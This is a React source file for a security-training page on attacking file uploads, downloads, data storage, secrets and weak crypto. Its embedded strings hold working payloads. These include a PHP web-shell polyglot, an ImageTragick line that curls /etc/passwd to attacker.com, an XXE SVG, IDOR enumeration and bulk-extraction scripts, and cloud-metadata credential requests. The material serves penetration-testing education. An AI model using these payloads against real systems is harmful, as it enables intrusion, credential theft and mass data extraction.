import React, { useState } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import {
  Box,
  Typography,
  Container,
  Paper,
  alpha,
  useTheme,
  Tabs,
  Tab,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Chip,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  IconButton,
  Divider,
  Alert,
  Card,
  CardContent,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Button,
} from "@mui/material";
import { Link, useNavigate } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import UploadFileIcon from "@mui/icons-material/UploadFile";
import DownloadIcon from "@mui/icons-material/Download";
import StorageIcon from "@mui/icons-material/Storage";
import HistoryIcon from "@mui/icons-material/History";
import VpnKeyIcon from "@mui/icons-material/VpnKey";
import EnhancedEncryptionIcon from "@mui/icons-material/EnhancedEncryption";
import OutputIcon from "@mui/icons-material/Output";
import ChecklistIcon from "@mui/icons-material/Checklist";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import WarningIcon from "@mui/icons-material/Warning";
import InfoIcon from "@mui/icons-material/Info";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import FolderIcon from "@mui/icons-material/Folder";
import CodeIcon from "@mui/icons-material/Code";
import TerminalIcon from "@mui/icons-material/Terminal";
import CloudIcon from "@mui/icons-material/Cloud";
import DataObjectIcon from "@mui/icons-material/DataObject";
import SearchIcon from "@mui/icons-material/Search";
import LinkIcon from "@mui/icons-material/Link";
import DeleteIcon from "@mui/icons-material/Delete";
import BackupIcon from "@mui/icons-material/Backup";
import DescriptionIcon from "@mui/icons-material/Description";
import KeyIcon from "@mui/icons-material/Key";
import LockOpenIcon from "@mui/icons-material/LockOpen";
import DangerousIcon from "@mui/icons-material/Dangerous";
import QuizIcon from "@mui/icons-material/Quiz";

interface TabPanelProps {
  children?: React.ReactNode;
  index: number;
  value: number;
}

function TabPanel(props: TabPanelProps) {
  const { children, value, index, ...other } = props;
  return (
    <div role="tabpanel" hidden={value !== index} {...other}>
      {value === index && <Box sx={{ pt: 3 }}>{children}</Box>}
    </div>
  );
}

interface Section {
  id: string;
  title: string;
  icon: React.ReactNode;
  color: string;
  subsections: SubSection[];
}

interface SubSection {
  title: string;
  points?: string[];
  code?: string;
  table?: { headers: string[]; rows: string[][] };
  warning?: string;
  tip?: string;
  testIdeas?: string[];
}

const sections: Section[] = [
  {
    id: "file-uploads",
    title: "1. Attacking File Uploads",
    icon: <UploadFileIcon />,
    color: "#ef4444",
    subsections: [
      {
        title: "Finding Upload Points",
        points: [
          "Profile pictures and avatars - often the least secured upload",
          "Document uploads: resumes, contracts, invoices, support attachments",
          "Import/export features: CSV, XML, JSON data imports",
          "Support ticket systems with file attachments",
          "Rich-text editors (CKEditor, TinyMCE) with image insertion",
          "Backup/restore functionality expecting archive uploads",
          "API endpoints accepting multipart/form-data",
          "Mobile app sync features with file upload capability",
          "Admin panels with theme/plugin upload",
          "Chat/messaging systems with media sharing",
        ],
        tip: "Don't just look at obvious upload forms. Check AJAX requests, mobile APIs, and admin-only functionality.",
      },
      {
        title: "Bypassing Client-Side Validation",
        points: [
          "Intercept request in Burp and change Content-Type header",
          "Modify file extension after client validation passes",
          "Use browser dev tools to remove JavaScript validators",
          "Upload through the API directly, bypassing the UI entirely",
          "Disable JavaScript and try the upload form",
        ],
        code: `# Client says only .jpg allowed? Try these in Burp:

# Change Content-Type while keeping malicious extension
Content-Type: image/jpeg
filename="shell.php"

# Or keep extension but change content
Content-Type: application/x-php
filename="innocent.jpg"`,
      },
      {
        title: "Extension Bypass Techniques",
        table: {
          headers: ["Technique", "Example", "Why It Works"],
          rows: [
            ["Double extension", "shell.php.jpg", "Server checks last ext, executes first"],
            ["Case manipulation", "shell.PhP, shell.pHP", "Case-insensitive filesystems"],
            ["Null byte (legacy)", "shell.php%00.jpg", "String termination in older languages"],
            ["Alternate extensions", ".php5, .phtml, .phar", "Not in blacklist but still executed"],
            ["Space/dot suffix", "shell.php. or shell.php ", "Windows filesystem quirks"],
            ["NTFS streams", "shell.php::$DATA", "Windows alternate data streams"],
            ["Unicode tricks", "shell.p\\u0068p", "Normalization bypasses"],
            [".htaccess upload", "AddType application/x-httpd-php .jpg", "Make jpg files execute as PHP"],
            ["Special files", ".user.ini, web.config", "Override server configuration"],
          ],
        },
      },
      {
        title: "Polyglot Files",
        points: [
          "GIFAR: Valid GIF that's also a valid JAR archive",
          "PNG + PHP: Image with PHP code in metadata/comments",
          "PDF + JavaScript: Malicious scripts inside valid PDF",
          "ZIP + HTML: Archive that browsers render as HTML",
          "BMP + executable: Bitmap header followed by shellcode",
        ],
        code: `# Create a PHP polyglot that passes image validation
# GIF89a is a valid GIF header

GIF89a<?php system($_GET['cmd']); ?>

# Or embed in PNG EXIF data
exiftool -Comment='<?php echo shell_exec($_GET["cmd"]); ?>' image.png`,
        warning: "Polyglots can bypass content inspection that only checks magic bytes at the start of the file.",
      },
      {
        title: "Path Traversal in Filenames",
        points: [
          "Try ../../../etc/passwd as filename (overwrites if writeable)",
          "URL encode: ..%2F..%2F..%2Fetc%2Fpasswd",
          "Double URL encode: ..%252F..%252F",
          "Unicode encoding: ..%c0%af..%c0%af",
          "Overwrite application files: ../config.php, ../web.config",
          "Overwrite log files for log poisoning",
          "Target .htaccess or .user.ini for configuration injection",
        ],
        testIdeas: [
          "Does the app sanitize filename before saving?",
          "Can you control the directory as well as filename?",
          "What happens with very long filenames?",
          "Are special characters stripped or encoded?",
        ],
      },
      {
        title: "Abusing File Processors",
        points: [
          "ImageMagick: CVE-2016-3714 (ImageTragick) - RCE via image processing",
          "Ghostscript: PostScript/PDF processing vulnerabilities",
          "LibreOffice: Document conversion leading to SSRF or RCE",
          "FFmpeg: HLS playlist SSRF, local file inclusion",
          "XML parsers: XXE in SVG, DOCX, XLSX uploads",
          "Archive extraction: Zip slip (path traversal during unzip)",
          "PDF generators: SSRF via external resources in HTML-to-PDF",
        ],
        code: `# ImageTragick payload (CVE-2016-3714)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/x.jpg"|curl "http://attacker.com/?data=$(cat /etc/passwd))'
pop graphic-context

# SVG with XXE
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>

# Zip Slip - malicious archive entry
../../../var/www/html/shell.php`,
        warning: "Even if you can't get direct RCE, file processors can give you SSRF, file read, or DoS.",
      },
      {
        title: "Where Uploads Land",
        points: [
          "Check if uploads go to web root (directly accessible)",
          "Look for predictable paths: /uploads/, /files/, /media/, /attachments/",
          "Check if files keep original names or get randomized",
          "Test if uploaded files are served with their original Content-Type",
          "See if there's a CDN or separate storage domain",
          "Check for directory listing on upload folders",
        ],
        testIdeas: [
          "Upload a file and try to access it directly - does it execute?",
          "Can you guess/bruteforce the upload path?",
          "Is there a signed URL or token required to access uploads?",
          "Do files get scanned/processed before being accessible?",
          "Is there a delay before files become available (async processing)?",
        ],
      },
    ],
  },
  {
    id: "file-downloads",
    title: "2. Attacking File Downloads",
    icon: <DownloadIcon />,
    color: "#f97316",
    subsections: [
      {
        title: "Identifying Download Endpoints",
        points: [
          "Export/download buttons for reports, invoices, statements",
          "Document management and file sharing features",
          "Backup/restore download functionality",
          "Log and audit trail exports",
          "Configuration or settings export",
          "User data export (GDPR compliance features)",
          "Attachment downloads in messaging/tickets",
          "API endpoints returning file content",
        ],
        code: `# Common parameter patterns to look for:
/download?file=report.pdf
/export?path=/reports/2024/q1.xlsx
/api/files?name=document.docx
/attachments?id=12345
/documents/{filename}
/static/{path}
/media/{category}/{file}`,
      },
      {
        title: "Path Traversal on Read",
        points: [
          "Basic traversal: ../../etc/passwd",
          "URL encoded: ..%2F..%2Fetc%2Fpasswd",
          "Double encoded: ..%252F..%252Fetc%252Fpasswd",
          "UTF-8 encoding: ..%c0%af..%c0%af",
          "Mixed: ..\\../ or ../..\\",
          "Absolute paths: /etc/passwd or C:\\Windows\\win.ini",
          "Null byte injection (old systems): file.txt%00.jpg",
          "Excessive traversal: ../../../../../../../../etc/passwd",
        ],
        table: {
          headers: ["Target", "Linux Path", "Windows Path"],
          rows: [
            ["Passwd file", "/etc/passwd", "C:\\Windows\\win.ini"],
            ["Shadow file", "/etc/shadow", "C:\\Windows\\System32\\config\\SAM"],
            ["Web config", "/var/www/html/.htaccess", "C:\\inetpub\\wwwroot\\web.config"],
            ["App config", "/var/www/app/.env", "C:\\App\\appsettings.json"],
            ["SSH keys", "/root/.ssh/id_rsa", "C:\\Users\\Admin\\.ssh\\id_rsa"],
            ["History", "/root/.bash_history", "C:\\Users\\Admin\\AppData\\...\\History"],
            ["Hosts file", "/etc/hosts", "C:\\Windows\\System32\\drivers\\etc\\hosts"],
            ["Proc self", "/proc/self/environ", "N/A"],
          ],
        },
      },
      {
        title: "IDOR in File Downloads",
        points: [
          "Try sequential IDs: /download?id=123 → try 122, 124, 1, 999999",
          "Try UUIDs with predictable patterns",
          "Check if your user ID is in the filename pattern",
          "Test accessing other users' files by changing user identifiers",
          "Look for batch/bulk download features that enumerate",
          "Check API endpoints for different access patterns",
        ],
        code: `# Burp Intruder payloads for ID enumeration
GET /api/documents/§123§/download

# Payload: Numbers 1-10000
# Look for 200 responses with different sizes

# Or script it:
for i in {1..10000}; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}\\n" \\
    "https://target.com/download?id=$i" -H "Cookie: session=xxx"
done | grep "200"`,
        testIdeas: [
          "Can you access files from before your account was created?",
          "Can you access files marked as 'deleted'?",
          "Are there admin-only files you can reach?",
          "Can you export other users' data via GDPR export feature?",
        ],
      },
      {
        title: "Response Analysis",
        points: [
          "Check Content-Disposition header for original filenames",
          "Look for internal paths leaked in responses",
          "Check if error messages reveal file system structure",
          "Compare response sizes for existing vs non-existing files",
          "Check timing differences for different paths",
          "Look for file metadata in responses",
        ],
        warning: "Even if you can't read the file, error messages might reveal whether it exists, its size, or its path.",
      },
    ],
  },
  {
    id: "data-storage",
    title: "3. Data Storage - Attacker's View",
    icon: <StorageIcon />,
    color: "#8b5cf6",
    subsections: [
      {
        title: "What Counts as Sensitive Data",
        table: {
          headers: ["Category", "Examples", "Impact if Leaked"],
          rows: [
            ["Credentials", "Passwords, API keys, tokens, SSH keys", "Account takeover, lateral movement"],
            ["PII", "Names, emails, addresses, phone numbers, SSN", "Identity theft, GDPR fines"],
            ["Financial", "Card numbers, bank accounts, transactions", "Fraud, PCI-DSS violations"],
            ["Health", "Medical records, prescriptions, diagnoses", "HIPAA violations, blackmail"],
            ["Internal docs", "Contracts, roadmaps, M&A info", "Competitive damage, insider trading"],
            ["Source code", "Proprietary algorithms, security logic", "Finding more vulns, IP theft"],
            ["Session data", "Session tokens, JWTs, refresh tokens", "Session hijacking"],
            ["Encryption keys", "AES keys, private keys, salts", "Decrypt everything"],
          ],
        },
      },
      {
        title: "Where Data Hides in Typical Apps",
        points: [
          "Primary databases: PostgreSQL, MySQL, MongoDB, etc.",
          "Search indexes: Elasticsearch, Solr, Algolia (often less protected)",
          "Cache layers: Redis, Memcached (no auth by default)",
          "Object storage: S3, Azure Blob, GCS (misconfigured buckets)",
          "CDNs: Cached responses including authenticated data",
          "Message queues: RabbitMQ, Kafka, SQS (sensitive data in transit)",
          "Logging systems: ELK stack, Splunk, CloudWatch",
          "Browser storage: localStorage, sessionStorage, IndexedDB",
          "Mobile offline storage: SQLite, Realm, Core Data",
        ],
        code: `# Check browser storage in DevTools console:
JSON.stringify(localStorage)
JSON.stringify(sessionStorage)

# Check for IndexedDB databases
indexedDB.databases()

# Mobile app SQLite (after extracting app data)
sqlite3 app.db ".tables"
sqlite3 app.db "SELECT * FROM users"`,
      },
      {
        title: "Patterns That Scream 'Dump Me'",
        points: [
          "Verbose error messages showing SQL queries or stack traces",
          "Debug endpoints returning full application state",
          "'Download all' or 'Export to CSV' without pagination limits",
          "GraphQL introspection revealing the entire schema",
          "Admin panels with 'database backup' functionality",
          "Import features that show preview of all data",
          "Search that returns full objects instead of summaries",
          "APIs returning all fields when only some are needed",
          "Audit logs accessible to regular users",
          "'Forgot password' revealing if accounts exist",
        ],
        warning: "Features built for convenience (export, backup, debug) are often the fastest path to mass data extraction.",
      },
      {
        title: "Storage Misconfigurations to Hunt",
        points: [
          "S3 buckets with public read or list permissions",
          "Azure Blob containers with anonymous access",
          "Firebase databases with world-readable rules",
          "MongoDB/Redis/Elasticsearch exposed to internet",
          "GraphQL with no query depth limits (resource exhaustion + data dump)",
          "APIs with no rate limiting on data export",
          "Backup files stored in publicly accessible locations",
          "Database connection strings in client-side code",
        ],
        code: `# Check S3 bucket permissions
aws s3 ls s3://bucket-name --no-sign-request

# Check for public Azure blobs
curl "https://account.blob.core.windows.net/container?restype=container&comp=list"

# Check Firebase rules
curl "https://project.firebaseio.com/.json"

# Shodan for exposed databases
shodan search "mongodb port:27017"
shodan search "redis port:6379"`,
      },
    ],
  },
  {
    id: "logs-backups",
    title: "4. Logs, Caches, Backups & Temp Files",
    icon: <HistoryIcon />,
    color: "#10b981",
    subsections: [
      {
        title: "Log File Hunting",
        points: [
          "Error logs often contain stack traces, SQL queries, credentials",
          "Access logs reveal hidden endpoints and parameters",
          "Application logs may include sensitive business data",
          "Debug logs enabled in production = goldmine",
          "Audit logs show admin actions and sometimes credentials",
        ],
        table: {
          headers: ["Path Pattern", "What You Might Find"],
          rows: [
            ["/logs/, /log/", "Application and error logs"],
            ["/debug/, /status/", "Debug info, stack traces"],
            ["/health/, /metrics/", "System info, internal endpoints"],
            ["/trace/, /actuator/", "Spring Boot actuator endpoints"],
            ["/server-status", "Apache status page"],
            ["/nginx_status", "Nginx status info"],
            ["/.logs/, /var/log/", "System log directories"],
            ["/tmp/, /temp/", "Temporary file storage"],
          ],
        },
        code: `# Common log file names to brute force:
error.log, errors.log, error_log
access.log, access_log
debug.log, debug.txt
app.log, application.log
server.log, system.log
sql.log, query.log
audit.log, security.log
*.log.1, *.log.old, *.log.bak`,
      },
      {
        title: "Backup and Old File Discovery",
        points: [
          "Developers often leave backup copies during editing",
          "Deployment processes may leave old versions",
          "Database dumps sometimes live in web root",
          "Configuration backups with credentials",
          "Version control artifacts (.git, .svn)",
        ],
        table: {
          headers: ["Extension/Pattern", "What It Usually Is"],
          rows: [
            [".bak, .backup", "Backup copy of any file"],
            [".old, .orig", "Original before modification"],
            ["~, .swp, .swo", "Vim swap/backup files"],
            [".save, .saved", "Saved copies"],
            [".copy, .tmp", "Temporary copies"],
            [".zip, .tar, .gz", "Archived backups"],
            [".sql, .dump", "Database exports"],
            [".dist, .default", "Default/template configs"],
            ["Copy of *, (1), _backup", "Windows-style copies"],
          ],
        },
        code: `# Directory brute-forcing for backups
ffuf -w wordlist.txt -u https://target.com/FUZZ -e .bak,.old,.zip,.sql

# Check for Git exposure
curl https://target.com/.git/HEAD
curl https://target.com/.git/config

# If .git is exposed, dump it:
git-dumper https://target.com/.git/ ./output

# Common backup filenames
backup.zip, backup.sql, backup.tar.gz
db_backup.sql, database.sql, dump.sql
www.zip, site.zip, html.zip
config.php.bak, web.config.old`,
      },
      {
        title: "Temp Files and Caches",
        points: [
          "Export/report caches may contain sensitive data",
          "Upload temp directories before files are processed",
          "Session files in accessible locations",
          "Preview/thumbnail caches for documents",
          "API response caches",
          "Search index caches",
        ],
        code: `# Common temp/cache locations:
/tmp/, /temp/, /cache/
/uploads/tmp/, /files/temp/
/.cache/, /var/cache/
/sessions/, /sess_*
/preview/, /thumbnails/
/export/, /reports/temp/

# PHP session files
/tmp/sess_[session_id]
/var/lib/php/sessions/sess_*`,
        testIdeas: [
          "Start a data export, cancel it - is the temp file still there?",
          "Upload a file, fail validation - is it still in temp?",
          "Check if cache files are accessible without auth",
          "Look for session files with predictable names",
        ],
      },
      {
        title: "Finding Hidden Files - Techniques",
        points: [
          "Directory brute-forcing with good wordlists",
          "Append common extensions to known files",
          "Check robots.txt and sitemap.xml for hints",
          "Look at JavaScript for referenced paths",
          "Wayback Machine for historical file listings",
          "Google dorking: site:target.com filetype:log",
          "Check error pages for path disclosure",
        ],
        code: `# Comprehensive discovery
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,bak,old,zip,sql,log,txt

# Check Wayback Machine for old files
waybackurls target.com | grep -E "\\.(bak|old|zip|sql|log|config)$"

# Google dorking
site:target.com filetype:log
site:target.com filetype:sql
site:target.com filetype:bak
site:target.com "index of" backup`,
      },
    ],
  },
  {
    id: "secrets-hunting",
    title: "5. Secrets Hunting",
    icon: <VpnKeyIcon />,
    color: "#f59e0b",
    subsections: [
      {
        title: "Secrets in Code and Repos",
        points: [
          "Configuration files: .env, config.*, settings.*, application.yml",
          "Local development files: local.settings.json, .env.local, .env.development",
          "Test files often have hardcoded credentials for test environments",
          "CI/CD configs: .github/workflows/*.yml, .gitlab-ci.yml, Jenkinsfile",
          "Infrastructure as Code: terraform.tfstate, *.tfvars (often in state files)",
          "Docker configs: docker-compose.yml, Dockerfile (build args)",
          "Sample/example scripts that work 'out of the box' with real creds",
        ],
        code: `# Git history mining
git log --all --full-history -- "**/config*" "**/secret*" "**/.env*"
git log -p --all -S "password" -- . 
git log -p --all -S "API_KEY" -- .

# Search all commits for secrets
git rev-list --all | xargs git grep -l "password\\|secret\\|api.key"

# Check reflog for deleted commits
git reflog | head -20
git show [commit-hash]

# Clone and scan with tools
trufflehog git https://github.com/target/repo
gitleaks detect --source=./repo`,
      },
      {
        title: "Common Secret Patterns",
        table: {
          headers: ["Service", "Pattern/Format", "Regex Hint"],
          rows: [
            ["AWS Access Key", "AKIA[0-9A-Z]{16}", "Starts with AKIA"],
            ["AWS Secret Key", "40 chars base64", "Often near access key"],
            ["GitHub Token", "ghp_[A-Za-z0-9_]{36}", "Starts with ghp_"],
            ["Slack Token", "xox[baprs]-...", "Starts with xox"],
            ["Google API Key", "AIza[0-9A-Za-z\\-_]{35}", "Starts with AIza"],
            ["Stripe Key", "sk_live_[0-9a-zA-Z]{24}", "sk_live_ prefix"],
            ["JWT", "eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.", "Base64 JSON structure"],
            ["Private Key", "-----BEGIN.*PRIVATE KEY-----", "PEM format"],
            ["Generic password", "password.*=.*['\"]", "Assignment patterns"],
          ],
        },
      },
      {
        title: "Secrets in Front-End and Binaries",
        points: [
          "JavaScript bundles often contain API keys, especially for third-party services",
          "Source maps (.map files) can reveal original source with comments",
          "Mobile APKs: strings, assets, shared_prefs, res/values/strings.xml",
          "iOS IPAs: embedded plists, entitlements, keychain access groups",
          "Desktop apps: resources, embedded configs, update mechanisms",
          "Electron apps: essentially web apps, check asar archives",
        ],
        code: `# Extract strings from JavaScript
curl https://target.com/main.js | grep -oE '[A-Za-z0-9_]{20,}' | sort -u

# Find source maps
curl https://target.com/main.js | grep -i sourceMappingURL
curl https://target.com/main.js.map

# APK analysis
apktool d app.apk
grep -r "api_key\\|password\\|secret" app/

# Search for hardcoded strings
strings binary | grep -iE "password|secret|key|token"

# Electron app extraction
npx asar extract app.asar extracted/`,
        testIdeas: [
          "Search for API keys that work in production",
          "Check if debug/test keys give elevated access",
          "Look for internal API endpoints in mobile apps",
          "Find admin credentials in test configurations",
        ],
      },
      {
        title: "Secrets in Infrastructure",
        points: [
          "Cloud metadata services: AWS (169.254.169.254), Azure, GCP",
          "Environment variables in server responses or error pages",
          "Open dashboards: Prometheus, Grafana, Kibana, Jenkins",
          "CI/CD pipeline outputs and build logs",
          "Container registries with public images",
          "Kubernetes secrets (if you have cluster access)",
          "Service mesh configs and sidecar proxies",
        ],
        code: `# AWS metadata (from SSRF or compromised instance)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure metadata
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# GCP metadata
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Kubernetes secrets (if you have access)
kubectl get secrets --all-namespaces
kubectl get secret [name] -o jsonpath='{.data}'`,
        warning: "Cloud metadata endpoints are a goldmine via SSRF - they often return temporary credentials with significant permissions.",
      },
      {
        title: "Secret Verification",
        points: [
          "Always verify secrets in a way that doesn't cause damage",
          "For API keys: make a read-only API call",
          "For database creds: connect but don't modify data",
          "For cloud creds: check permissions with read-only actions",
          "Document the finding and impact without exploitation",
          "Be careful with rate limits and lockouts",
        ],
        code: `# Safe AWS key verification
aws sts get-caller-identity --profile found-creds

# Safe GitHub token check
curl -H "Authorization: token ghp_xxx" https://api.github.com/user

# Safe Slack token check
curl -H "Authorization: Bearer xoxb-xxx" https://slack.com/api/auth.test

# Check what permissions an API key has without using them
# Most services have a "whoami" or "info" endpoint`,
      },
    ],
  },
  {
    id: "crypto-misuse",
    title: "6. Exploiting Crypto Misuse",
    icon: <EnhancedEncryptionIcon />,
    color: "#6366f1",
    subsections: [
      {
        title: "Spotting Roll-Your-Own Crypto",
        points: [
          "Custom 'encryption' classes in source code",
          "XOR with a static key (reversible with known plaintext)",
          "Base64 presented as 'encryption' (it's encoding, not encryption)",
          "ROT13, character substitution, or transposition ciphers",
          "MD5 or SHA1 for 'encrypting' sensitive data (they're hashes)",
          "Custom key derivation instead of PBKDF2/Argon2",
          "Homemade random number generators for cryptographic purposes",
        ],
        code: `# Signs of weak crypto in code:
"encrypt" function that's just base64
XOR with a hardcoded key
MD5/SHA1 used for anything but checksums
Math.random() or rand() for security purposes
Custom substitution ciphers

# Example of weak "encryption" to spot:
function encrypt(data) {
  return btoa(data);  // Just base64!
}

function encrypt(data, key) {
  return data.split('').map((c, i) => 
    String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))
  ).join('');  // Simple XOR
}`,
        warning: "If you see custom crypto, it's almost certainly breakable. Report it as 'use of weak cryptography'.",
      },
      {
        title: "Weak Encryption of Stored Data",
        points: [
          "Same ciphertext for identical inputs = no IV/nonce or ECB mode",
          "ECB mode produces recognizable patterns in structured data",
          "Reused IVs with stream ciphers = XOR of plaintexts recoverable",
          "Hardcoded encryption keys (same key for all users/instances)",
          "Keys derived predictably from known values (user ID, timestamp)",
          "Encryption without authentication (AES-CBC vs AES-GCM)",
        ],
        code: `# ECB mode detection - encrypt same block twice
# If ciphertext has repeating 16-byte blocks, it's ECB

# Compare ciphertexts:
user1_encrypted: aGVsbG8gd29ybGQ=
user2_encrypted: aGVsbG8gd29ybGQ=
# Same ciphertext = same plaintext = deterministic encryption

# Stream cipher with reused IV:
ciphertext1 XOR ciphertext2 = plaintext1 XOR plaintext2
# With known plaintext1, recover plaintext2`,
        table: {
          headers: ["Weakness", "How to Detect", "How to Exploit"],
          rows: [
            ["ECB mode", "Repeating blocks in ciphertext", "Pattern analysis, block swapping"],
            ["No IV", "Same plaintext = same ciphertext", "Precompute common values"],
            ["Weak key", "Key in config/code", "Decrypt everything offline"],
            ["No integrity", "Modify ciphertext, still decrypts", "Bit flipping attacks"],
            ["Predictable IV", "Sequential or timestamp-based", "Decrypt with known IV"],
          ],
        },
      },
      {
        title: "Integrity Without Actual Integrity",
        points: [
          "'Encrypted' data that's not authenticated (MAC/AEAD)",
          "Signatures that aren't actually verified",
          "License files with encryption but no tamper detection",
          "Config files where you can flip bits to change values",
          "JWT 'none' algorithm or algorithm confusion attacks",
        ],
        code: `# CBC bit-flipping attack
# Modify ciphertext byte to change corresponding plaintext byte
# Useful when you know structure: "admin=false" → "admin=true"

# Position to flip: block_size + (position_in_block)
# XOR with: (original_char XOR desired_char)

import struct
ciphertext = bytearray(encrypted_cookie)
target_pos = 16 + 6  # Assuming "admin=" at position 6 in block 2
ciphertext[target_pos] ^= ord('f') ^ ord('t')  # Change 'f' to 't'`,
        testIdeas: [
          "Can you modify encrypted data and have it still accepted?",
          "Does changing ciphertext produce meaningful plaintext changes?",
          "Are signatures/HMACs actually verified, or just present?",
          "Can you downgrade to 'none' algorithm?",
        ],
      },
      {
        title: "Attacks Enabled by Bad Crypto",
        points: [
          "Decrypt exported data to access sensitive information",
          "Forge license files to unlock premium features",
          "Modify encrypted configuration to escalate privileges",
          "Bypass paywalls or usage limits via decrypted state",
          "Access other users' data by predicting/deriving their keys",
          "Recover passwords from poorly encrypted storage",
        ],
        code: `# Example: Decrypting 'encrypted' config with hardcoded key
from Crypto.Cipher import AES
import base64

# Found in decompiled code:
KEY = b'SuperSecretKey16'  # Hardcoded!

encrypted = base64.b64decode(config_value)
cipher = AES.new(KEY, AES.MODE_ECB)  # ECB mode!
decrypted = cipher.decrypt(encrypted)
print(decrypted)`,
        warning: "The goal isn't to break AES - it's to find where crypto is misused, making 'secure' features trivially bypassable.",
      },
    ],
  },
  {
    id: "data-exfil",
    title: "7. Data Exfiltration & Impact",
    icon: <OutputIcon />,
    color: "#dc2626",
    subsections: [
      {
        title: "From Small Leak to Big Breach",
        points: [
          "One exposed config file → database credentials → full DB dump",
          "Leaked API key → access to cloud storage → customer PII",
          "Debug endpoint → session tokens → account takeover at scale",
          "Backup file → source code → more vulnerabilities → RCE",
          "SSRF to metadata → cloud credentials → lateral movement",
          "Single IDOR → enumeration script → all users' data",
        ],
        tip: "Always trace the 'pivot potential' - what can you access with what you found?",
      },
      {
        title: "Exfiltration Paths",
        points: [
          "Legitimate export features abused for bulk extraction",
          "API pagination bypassed or exhausted",
          "Report generators that don't limit data scope",
          "Async job systems that process large datasets",
          "SSRF chained to hit internal storage directly",
          "GraphQL queries requesting entire datasets",
          "File download IDOR iterated across all IDs",
          "Search with no rate limiting",
        ],
        code: `# Bulk IDOR extraction
for id in range(1, 100000):
    response = requests.get(f"https://target.com/api/users/{id}/data",
                           headers={"Authorization": f"Bearer {token}"})
    if response.status_code == 200:
        save_to_file(response.json())

# GraphQL data dump (if no depth limits)
query {
  users {
    id, email, password_hash, ssn
    orders { id, total, items { name, price } }
    messages { content, recipient { email } }
  }
}

# Export feature abuse
POST /api/export
{"format": "csv", "filters": {}, "limit": 999999999}`,
      },
      {
        title: "Chaining Vulnerabilities for Data Access",
        table: {
          headers: ["Start With", "Chain To", "End Result"],
          rows: [
            ["SSRF", "Cloud metadata", "Temporary credentials"],
            ["LFI", "Config file", "Database credentials"],
            ["SQLi", "File read", "Source code / configs"],
            ["XSS", "Admin session", "Full admin access"],
            ["IDOR", "User enumeration", "Mass data extraction"],
            ["Debug endpoint", "Memory dump", "Secrets in memory"],
            ["Path traversal", "Backup file", "Database dump"],
          ],
        },
      },
      {
        title: "Framing Impact for Reports",
        points: [
          "Quantify the volume: '50,000 user records', not 'some data'",
          "Specify sensitivity: 'Including SSN, DOB, and passwords' vs 'PII'",
          "Show pivot potential: 'These credentials allow RDS access'",
          "Reference regulations: GDPR, HIPAA, PCI-DSS, SOX implications",
          "Calculate business impact: breach notification costs, fines, reputation",
          "Demonstrate ease of exploitation: 'Single authenticated request'",
        ],
        code: `# Good impact statement:
"An authenticated attacker can extract all 847,000 customer records 
including: full names, email addresses, hashed passwords (MD5), 
home addresses, phone numbers, and last 4 digits of credit cards.

The API has no rate limiting, allowing full extraction in ~2 hours.
This constitutes a reportable breach under GDPR with potential fines 
up to 4% of annual revenue."

# vs weak:
"User data can be accessed."`,
      },
    ],
  },
  {
    id: "checklist",
    title: "8. Attacker Checklist",
    icon: <ChecklistIcon />,
    color: "#0ea5e9",
    subsections: [
      {
        title: "File Upload Checklist",
        testIdeas: [
          "Where can I upload files? (Profile pics, documents, imports, support tickets)",
          "What happens if I change Content-Type vs extension?",
          "Can I use double extensions, null bytes, or case tricks?",
          "Does path traversal work in the filename?",
          "Do polyglot files bypass content inspection?",
          "Are uploaded files accessible directly? Executable?",
          "What file processors run on uploads? (ImageMagick, LibreOffice, etc.)",
          "Can I overwrite existing files like .htaccess or config?",
        ],
      },
      {
        title: "File Download Checklist",
        testIdeas: [
          "Where are download/export endpoints? What parameters do they take?",
          "Does path traversal work? (../../etc/passwd and encoded variants)",
          "Can I guess or enumerate file IDs?",
          "Do error messages leak file paths or existence?",
          "Can I access other users' files via IDOR?",
          "Are there backup/export features I can abuse for bulk extraction?",
        ],
      },
      {
        title: "Data Storage Checklist",
        testIdeas: [
          "What databases, caches, and storage systems are in use?",
          "Are there public S3 buckets, Azure blobs, or Firebase databases?",
          "Do error messages reveal queries, paths, or structure?",
          "Are there 'export all' or 'debug' features exposing data?",
          "Is GraphQL introspection enabled? What's the full schema?",
          "Is there sensitive data in browser localStorage/sessionStorage?",
        ],
      },
      {
        title: "Logs, Backups & Temp Files Checklist",
        testIdeas: [
          "Are /logs, /debug, /status, /health, /metrics accessible?",
          "Can I find .bak, .old, .zip, .sql, .swp files in web root?",
          "Is .git or .svn directory exposed?",
          "Are temp upload or export directories accessible?",
          "Do cached reports or previews contain sensitive data?",
          "What does Wayback Machine show for this domain?",
        ],
      },
      {
        title: "Secrets Hunting Checklist",
        testIdeas: [
          "What's in .env, config files, and CI/CD configs?",
          "Does git history contain deleted secrets?",
          "Are there API keys in JavaScript bundles or source maps?",
          "Can I extract secrets from mobile apps (APK/IPA)?",
          "Are Prometheus, Grafana, Jenkins, or similar dashboards open?",
          "Can SSRF reach cloud metadata endpoints?",
          "Are there hardcoded test/dev credentials that work in prod?",
        ],
      },
      {
        title: "Crypto Abuse Checklist",
        testIdeas: [
          "Is 'encryption' actually just encoding (base64, hex)?",
          "Does same plaintext produce same ciphertext? (No IV/ECB mode)",
          "Are encryption keys hardcoded in source or config?",
          "Can I modify encrypted data and have it still accepted? (No integrity)",
